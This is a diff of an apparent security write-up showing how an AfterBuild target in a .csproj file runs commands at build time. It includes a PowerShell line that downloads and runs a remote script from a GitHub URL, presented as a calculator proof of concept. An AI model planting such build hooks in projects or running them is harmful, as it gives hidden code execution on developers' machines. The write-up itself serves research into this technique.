@@ -36,19 +36,21 @@ I'm lucky that I've noticed the details about .csproj file and I have achieved m
 
 
 At the end of the .csproj file,there is a detail:
-'<!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+```<!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
        Other similar extension points exist, see Microsoft.Common.targets.
   <Target Name="BeforeBuild">
   </Target>
   <Target Name="AfterBuild">
   </Target>
-  -->'
+  -->
+  ```
 
 So I change this and add the following code:
 
-'<Target Name="AfterBuild">
+```<Target Name="AfterBuild">
     <Exec Command="calc.exe"/>
-  </Target>'
+  </Target>
+  ```
 
 Success to run calc.exe,but the build blocked.Like this:
 
@@ -65,10 +67,10 @@ https://github.com/3gstudent/test/blob/master/calc.ps1
 
 
 Use the DownloadString of Powershell,code is:
-
-'<Target Name="AfterBuild">
+```<Target Name="AfterBuild">
     <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc.ps1');"/>
-  </Target>'
+  </Target>
+```
 
 Then,we made it.
 
